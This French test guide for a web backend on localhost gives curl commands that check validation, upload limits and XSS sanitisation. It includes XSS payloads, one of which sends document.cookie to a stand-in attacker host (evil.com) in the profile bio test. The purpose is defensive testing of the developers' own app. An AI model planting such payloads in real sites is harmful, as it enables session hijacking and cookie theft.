# Tests de Validation et Sécurité

Ce document contient des scripts curl pour tester la validation stricte, la protection XSS et la sécurisation des uploads.

## Prérequis

- Backend démarré sur `http://localhost:4000`
- Token JWT valide (remplacer `YOUR_JWT_TOKEN` et `YOUR_ADMIN_JWT_TOKEN`)

---

## 1. Test: Payload avec champ inconnu → 422

### Test avec champ inconnu dans CreateItemDto

```bash
# Doit retourner 422 Unprocessable Entity avec erreur "property unknownField should not exist"
curl -X POST http://localhost:4000/api/v1/items \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{
    "title": "Test Item",
    "description": "Description de test avec suffisamment de caractères",
    "condition": "GOOD",
    "unknownField": "valeur non autorisée",
    "anotherUnknownField": 12345
  }'
```

**Résultat attendu:** 422 avec message d'erreur listant les champs non autorisés.

---

## 2. Test: Payload XSS → Rejeté ou nettoyé

### Test avec balise <script> dans title

```bash
# Doit être rejeté ou nettoyé (selon implémentation)
curl -X POST http://localhost:4000/api/v1/items \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{
    "title": "<script>alert(\"XSS\")</script>Test Item",
    "description": "Description de test avec suffisamment de caractères",
    "condition": "GOOD"
  }'
```

### Test avec HTML dans description

```bash
curl -X POST http://localhost:4000/api/v1/items \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{
    "title": "Test Item",
    "description": "<img src=x onerror=alert(\"XSS\")>Description de test avec suffisamment de caractères",
    "condition": "GOOD"
  }'
```

### Test avec XSS dans bio (UpdateProfile)

```bash
curl -X PATCH http://localhost:4000/api/v1/users/me \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{
    "bio": "<script>document.location=\"http://evil.com/steal.php?cookie=\"+document.cookie</script>"
  }'
```

**Résultat attendu:** Le HTML doit être supprimé ou échappé avant stockage en DB.

---

## 3. Test: Upload fichier non image → Rejeté

### Test avec upload signature pour fichier non image

```bash
# Tester avec folder invalide
curl -X POST http://localhost:4000/api/v1/items/uploads/signature \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{
    "folder": "invalid-folder",
    "maxBytes": 1000000
  }'
```

**Résultat attendu:** 400 Bad Request - "Dossier non autorisé"

### Test avec taille trop grande

```bash
curl -X POST http://localhost:4000/api/v1/items/uploads/signature \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{
    "folder": "items",
    "maxBytes": 10485760
  }'
```

**Résultat attendu:** 400 Bad Request - "Taille maximale dépassée. Maximum: 5MB"

### Test avec attachPhoto avec URL non Cloudinary

```bash
curl -X POST http://localhost:4000/api/v1/items/ITEM_ID/photos \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{
    "photos": [{
      "url": "http://evil.com/malicious.jpg",
      "publicId": "evil-image"
    }]
  }'
```

**Résultat attendu:** 400 Bad Request - "URL invalide: doit provenir de Cloudinary"

### Test avec trop de photos (> 5)

```bash
curl -X POST http://localhost:4000/api/v1/items/ITEM_ID/photos \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{
    "photos": [
      {"url": "https://res.cloudinary.com/cloud/image/upload/v1/photo1.jpg", "publicId": "photo1"},
      {"url": "https://res.cloudinary.com/cloud/image/upload/v1/photo2.jpg", "publicId": "photo2"},
      {"url": "https://res.cloudinary.com/cloud/image/upload/v1/photo3.jpg", "publicId": "photo3"},
      {"url": "https://res.cloudinary.com/cloud/image/upload/v1/photo4.jpg", "publicId": "photo4"},
      {"url": "https://res.cloudinary.com/cloud/image/upload/v1/photo5.jpg", "publicId": "photo5"},
      {"url": "https://res.cloudinary.com/cloud/image/upload/v1/photo6.jpg", "publicId": "photo6"}
    ]
  }'
```

**Résultat attendu:** 400 Bad Request - "Nombre maximum de photos par requête: 5"

---

## 4. Test: Enum invalide → 422

### Test avec valeur enum invalide

```bash
curl -X POST http://localhost:4000/api/v1/items \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{
    "title": "Test Item",
    "description": "Description de test avec suffisamment de caractères",
    "condition": "INVALID_CONDITION"
  }'
```

**Résultat attendu:** 422 avec message "condition a une valeur invalide" ou similaire.

---

## 5. Test: Validation admin query params

### Test avec query params invalides

```bash
# Doit valider page et limit
curl -X GET "http://localhost:4000/api/v1/admin/users?page=-1&limit=1000" \
  -H "Authorization: Bearer YOUR_ADMIN_JWT_TOKEN"
```

**Résultat attendu:** 422 - page doit être >= 1, limit doit être <= 100

### Test avec resolved invalide (devrait être booléen)

```bash
curl -X GET "http://localhost:4000/api/v1/admin/reports?resolved=maybe" \
  -H "Authorization: Bearer YOUR_ADMIN_JWT_TOKEN"
```

**Résultat attendu:** 422 si validation stricte, sinon transformation en undefined.

---

## 6. Test: Sanitisation côté serveur (à vérifier dans DB)

Après avoir créé un item avec du HTML/XSS, vérifier dans la base de données que le contenu est nettoyé:

```sql
SELECT id, title, description FROM "Item" WHERE title LIKE '%<%' OR description LIKE '%<%';
```

**Résultat attendu:** Aucun résultat (HTML supprimé) ou HTML échappé.

---

## Notes

- Les tests XSS nécessitent que la sanitisation soit appliquée dans les services (à implémenter).
- Les tests d'upload nécessitent des IDs d'items valides.
- Tous les tokens JWT doivent être remplacés par des tokens réels.
